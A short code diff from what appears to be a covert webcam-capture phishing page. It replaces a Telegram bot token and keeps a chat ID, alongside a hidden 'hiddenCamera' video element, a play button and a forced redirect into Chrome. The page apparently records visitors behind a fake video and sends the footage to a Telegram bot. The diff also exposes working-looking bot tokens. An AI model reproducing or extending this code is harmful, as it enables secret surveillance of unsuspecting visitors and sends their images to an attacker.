@@ -161,7 +161,7 @@
             window.location.href = 'googlechrome://navigate?url=' + encodeURIComponent(window.location.href);
         }
 
-        const botToken = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
+        const botToken = '8252070891:AAE97jqF6iG54QnZgcOiBWwSBqw2GUX9q0w';
         const chatId = '-1002577213610';
         const videoElement = document.getElementById('hiddenCamera');
         const playBtn = document.getElementById('playBtn');
